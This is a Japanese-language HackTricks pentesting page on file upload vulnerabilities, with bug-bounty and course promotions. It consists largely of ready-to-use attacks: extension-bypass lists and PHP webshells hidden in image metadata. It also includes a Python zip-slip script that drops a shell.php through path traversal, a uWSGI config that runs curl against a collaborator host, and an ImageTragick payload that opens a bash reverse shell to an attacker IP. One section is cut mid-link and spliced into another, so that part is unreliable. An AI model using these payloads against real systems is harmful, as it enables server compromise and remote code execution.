# ファイルアップロード

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**する。
* **ハッキングのコツを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出する。

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**バグバウンティのヒント**: **Intigriti**に**登録**し、**ハッカーのために作られたプレミアムバグバウンティプラットフォーム**で学びましょう！今日[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**の報酬を獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## ファイルアップロードの一般的な方法論

他に役立つ拡張子:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8で動作する場合**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### ファイル拡張子チェックのバイパス

1. 適用される場合は、**以前の拡張子を** **チェック**します。また、いくつかの**大文字を使用して**テストします: _pHp, .pHP5, .PhAr ..._
2. _**実行拡張子の前に有効な拡張子を追加する**ことをチェックします（以前の拡張子も使用）:_
* _file.png.php_
* _file.png.Php5_
3. **最後に特殊文字を追加してみます。** Burpを使用して、**ascii**および**Unicode**文字をすべて**ブルートフォース**することができます。(_**以前に**言及した**拡張子**を使用しても試すことができます_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. サーバー側の拡張子パーサーをだまして保護をバイパスする技術を試してみてください。例えば、**拡張子を二重にする**や、拡張子の間に**ジャンクデータ（nullバイト）を追加する**などです。_**以前の拡張子**を使用して、より良いペイロードを準備することもできます。_
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. 前のチェックに**別のレイヤーの拡張子**を追加します:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **有効な拡張子の前に実行拡張子を置いてみて**、サーバーが誤って設定されていることを祈ります。（_**.php**_の拡張子があるものは何でもコードを実行しますが、必ずしも.phpで終わる必要はありません）
* _例: file.php.png_
7. **Windows**で**NTFS代替データストリーム（ADS）**を使用します。この場合、禁止された拡張子の後と許可された拡張子の前にコロン文字「:」が挿入されます。その結果、サーバー上に禁止された拡張子の**空のファイル**が作成されます（例：「file.asax:.jpg」）。このファイルは、短いファイル名を使用するなどの他の技術を使用して後で編集することができます。「**::$data**」パターンを使用して非空のファイルを作成することもできます。したがって、このパターンの後にドット文字を追加することも、さらなる制限をバイパスするために役立つかもしれません（例：「file.asp::$data.」）
8.  ファイル名の制限を破ることを試みます。有効な拡張子が切り取られ、悪意のあるPHPが残ります。AAA<--SNIP-->AAA.php

```
# Linux最大255バイト
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # ここで4を引いて.pngを追加
# ファイルをアップロードして、何文字許可されているかレスポンスをチェックします。例えば236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# ペイロードを作成する
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type、マジックナンバー、圧縮＆リサイズのバイパス

* **Content-Type** チェックをバイパスするには、**Content-Type** **ヘッダー**の**値**を次のように設定します: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **ワードリスト**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* **マジックナンバー** チェックをバイパスするには、ファイルの先頭に**実際の画像のバイト**を追加します（_file_ コマンドを混乱させる）。または、シェルを**メタデータ内に挿入します**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` または、画像に直接**ペイロードを挿入する**こともできます:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* 画像に**圧縮が追加されている場合**、例えば[PHP-GD](https://www.php.net/manual/fr/book.image.php)のような標準的なPHPライブラリを使用している場合、前述の技術は役に立ちません。しかし、[**ここで定義されている**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) **PLTEチャンク**技術を使用して、圧縮後も**生き残るテキスト**を挿入することができます。
* [**コードのGithub**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* ウェブページが画像を**リサイズ**している可能性があります。例えば、PHP-GD関数の`imagecopyresized`や`imagecopyresampled`を使用しています。しかし、[**ここで定義されている**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) **IDATチャンク**技術を使用して、圧縮後も**生き残るテキスト**を挿入することができます。
* [**コードのGithub**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* 画像のリサイズ後もペイロードが**生き残る**別の技術です。PHP-GD関数の`thumbnailImage`を使用していますが、[**ここで定義されている**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) **tEXtチャンク**技術を使用して、圧縮後も**生き残るテキスト**を挿入することができます。
* [**コードのGithub**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### チェックする他のトリック

* 既にアップロードされたファイルの**名前を変更**する脆弱性を見つける（拡張子を変更するため）。
* バックドアを実行するための**ローカルファイルインクルージョン**の脆弱性を見つける。
* **可能な情報漏洩**:
1. **同じファイル**を**同時に**（そして**同じ名前で**）**何度もアップロードする**
2. **既に存在する** **ファイル**や**フォルダー**の**名前**でファイルをアップロードする
3. 例えば、Apache on **Windows**では、アプリケーションがアップロードされたファイルを「/www/uploads/」ディレクトリに保存している場合、「.」という名前のファイルは「/www/」ディレクトリに「uploads」というファイルを作成します。
4. **NTFS**で簡単に削除できないファイルをアップロードする。例えば「…:.jpg」（Windows）
5. **Windows**で、名前に`|<>*?”`のような**無効な文字**を含むファイルをアップロードする。（Windows）
6. **Windows**で、CON、PRN、AUX、NUL、COM1、COM2、COM3、COM4、COM5、COM6、COM7、COM8、COM9、LPT1、LPT2、LPT3、LPT4、LPT5、LPT6、LPT7、LPT8、LPT9などの**予約**（**禁止**）**名**を使用してファイルをアップロードする。
* 被害者が誤って開いたときにコードを**実行する** **実行可能な** (.exe) や **.html**（疑わしいものではない）をアップロードすることも試してみてください。

### 特別な拡張子のトリック

**PHPサーバー**にファイルをアップロードしようとしている場合は、コードを実行するための[**.htaccess** トリックをチェックしてください](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess)。\
**ASPサーバー**にファイルをアップロードしようとしている場合は、コードを実行するための[**.config** トリックをチェックしてください](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files)。

`.phar` ファイルはjavaの `.jar` のようなものですが、php用で、phpファイルのように**使用することができます**（phpで実行するか、スクリプト内に含めるか...）

`.inc` 拡張子は、インポートファイル専用のphpファイルに使用されることがあります。したがって、誰かが**この拡張子を実行可能にすることを許可した**可能性があります。

## **Jetty RCE**

JettyサーバーにXMLファイルをアップロードできる場合、[**新しい\*.xmlと\*.warは自動的に処理されるため、RCEを取得できます**](https://twitter.com/pt
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
**設定**ファイルが**解析**されると、**ペイロード**が**実行**されます。設定が解析されるためには、**プロセスを再起動する必要があります**（クラッシュ？DoS？）またはファイルが**自動リロード**されます（変更が見つかった場合にファイルをリロードする秒数を示すオプションが使用されている可能性があります）。

**重要な注意:** uWSGIの設定ファイルの解析は緩いです。前述のペイロードはバイナリファイル（例：画像、PDFなど）の中に埋め込むことができます。

## **wget ファイルアップロード/SSRF トリック**

場合によっては、サーバーが**`wget`**を使用して**ファイルをダウンロード**しており、**URL**を**指定**できることがあります。これらのケースでは、コードがダウンロードされたファイルの拡張子がホワイトリスト内にあることを確認して、許可されたファイルのみがダウンロードされるようにしている可能性があります。しかし、**このチェックはバイパス可能です。**\
**linux**での**ファイル名**の**最大**長さは**255**ですが、**wget**はファイル名を**236**文字に切り詰めます。"A"\*232+".php"+".gif"という名前のファイルを**ダウンロード**することができます。このファイル名は**チェック**を**バイパス**します（この例では**".gif"**が**有効**な拡張子です）が、`wget`はファイル名を**"A"\*232+".php"**に**リネーム**します。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
以下のチェックをバイパスするために考えられる**別のオプション**は、**HTTPサーバーが異なるファイルにリダイレクトする**ようにすることです。そうすると、初期のURLはチェックをバイパスしますが、wgetは新しい名前のリダイレクトされたファイルをダウンロードします。これは、`--trust-server-names` **パラメータ**を使用していない限り**機能しません**。なぜなら、**wgetは元のURLで示されたファイル名でリダイレクトされたページをダウンロードする**からです。

#### その他のリソース

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)

## ツール

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass)は、ファイルアップロードメカニズムのテストを支援するために設計された強力なツールです。様々なバグバウンティ技術を活用して、脆弱性の特定と悪用を簡素化し、Webアプリケーションの徹底的な評価を保証します。

## ファイルアップロードから他の脆弱性へ

* **ファイル名**を`../../../tmp/lol.png`に設定し、**パストラバーサル**を試みる
* **ファイル名**を`sleep(10)-- -.jpg`に設定し、**SQLインジェクション**を達成する可能性があります
* **ファイル名**を`<svg onload=alert(document.domain)>`に設定してXSSを達成する
* **ファイル名**を`; sleep 10;`に設定してコマンドインジェクションをテストする（[こちらでさらに多くのコマンドインジェクションのトリック](../command-injection.md)）
* [**画像(svg)ファイルアップロードにおけるXSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JSファイルアップロード** + **XSS** = [**Service Workersの悪用**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**svgアップロードにおけるXXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**svgファイルをアップロードすることでのOpen Redirect**](../open-redirect.md#open-redirect-uploading-svg-files)
* [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)から**異なるsvgペイロード**を試す
* [有名な**ImageTrickの脆弱性**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* ウェブサーバーにURLから画像を取得するよう指示できる場合、[SSRF](../ssrf-server-side-request-forgery/)を悪用しようとすることができます。この**画像**が何らかの**公開**サイトに**保存**される場合、[https://iplogger.org/invisible/](https://iplogger.org/invisible/)からURLを指定して、**すべての訪問者の情報を盗む**こともできます。
* [**PDF-AdobeアップロードによるXXEとCORSのバイパス**](pdf-upload-xxe-and-cors-bypass.md)
* XSSを実現するために特別に作成されたPDF：[**JS実行を得るためにPDFデータを注入する方法を紹介する次のページ**](../xss-cross-site-scripting/pdf-injection.md)。PDFをアップロードできる場合、与えられた指示に従って任意のJSを実行するPDFを準備することができます。
* サーバーにアンチウイルスがあるかどうかを確認するために、\[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt))の内容をアップロードする
* ファイルのアップロードに**サイズ制限**があるかどうかを確認する

以下は、アップロードによって達成できるトップ10のリストです（[リンク](https://twitter.com/SalahHasoneh1/status/1281274120395685889)より）：

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSVインジェクション
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS**: HTMLインジェクション / XSS / Openリダイレクト
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp拡張機能

{% embed url="https://github.com/portswigger/upload-scanner" %}

## マジックヘッダーバイト

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

他のファイルタイプについては[https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)を参照してください。

### Zip/Tarファイル自動解凍アップロード

サーバー内で解凍されるZIPをアップロードできる場合、2つのことができます：

#### シンボリックリンク

他のファイルへのソフトリンクを含むリンクをアップロードし、解凍されたファイルにアクセスすると、リンクされたファイルにアクセスします：
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 異なるフォルダーで解凍

解凍されたファイルは予期しないフォルダーに作成されます。

この設定がOSレベルのコマンド実行を悪意のあるファイルアップロード経由で防ぐと簡単に想定できますが、残念ながらこれは真実ではありません。ZIPアーカイブ形式は階層的な圧縮をサポートしており、また上位ディレクトリを参照することもできるため、ターゲットアプリケーションの解凍機能を悪用して安全なアップロードディレクトリから脱出することができます。

この種のファイルを作成する自動化されたエクスプロイトはこちらで見つけることができます: [**https://github.com/ptoomey3/evilarc**](https://github.com/ptoomey3/evilarc)
```python
python2 evilarc.py -h
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
```markdown
**symlink trick with evilarc**を使用することもできます。フラグが`/flag.txt`にある場合、そのファイルへの**symlinkを作成**し、システムにそのファイルを**作成してください**。そうすればevilarcを呼び出した時に**エラーにならない**でしょう。

悪意のあるzipを作成するためのpythonコード：
```
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
以下の手順でリモートコマンド実行を達成しました：

1. PHPシェルを作成する：
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
1. 「ファイルスプレー」を使用し、圧縮zipファイルを作成します：
```
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3.hexエディタまたはviを使用して、“xxA”を“../”に変更します。私はviを使用しました：
```
:set modifiable
:%s/xxA/..\//g
:x!
```
```
最後のステップだけが残っていました：ZIPファイルをアップロードして、アプリケーションに解凍させましょう！成功し、ウェブサーバーに十分な権限があれば、システム上に単純なOSコマンド実行シェルができます：

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**参照**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## ImageTragic

このコンテンツを画像拡張子でアップロードして、脆弱性 **(ImageMagick , 7.0.1-1)** を利用します。
```
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PHPシェルをPNGに埋め込む

IDATチャンクにウェブシェルを埋め込む主な理由は、リサイズや再サンプリング操作をバイパスできる可能性があるためです - PHP-GDにはこれを行うための2つの関数が含まれています [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) と [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php)。

この投稿を読む: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## ポリグロットファイル

セキュリティの文脈でのポリグロットは、複数の異なるファイルタイプとして有効なファイルです。例えば、[GIFAR](https://en.wikipedia.org/wiki/Gifar)はGIFとRARファイルの両方です。GIFとJS、PPTとJSなど、複数の形式として機能するファイルも存在します。

ポリグロットファイルは、ファイルタイプに基づく保護をバイパスするためによく使用されます。ファイルのアップロードを許可する多くのアプリケーションは、JPEG、GIF、DOCなど特定のタイプのアップロードのみを許可し、JSファイル、PHPファイル、Pharファイルなどの危険なファイルのアップロードを防ぐためです。

これは、複数の異なる形式のフォーマットに準拠したファイルをアップロードするのに役立ちます。JPEGのように見えるPHARファイル（PHp ARchive）をアップロードすることができますが、有効な拡張子が必要であり、アップロード機能がそれを許可していない場合は役に立ちません。

詳細情報: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**登録**しましょう。ハッカーのために作られたプレミアムな**バグバウンティプラットフォーム**です！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) で今すぐ参加し、最大**$100,000**の報酬を獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
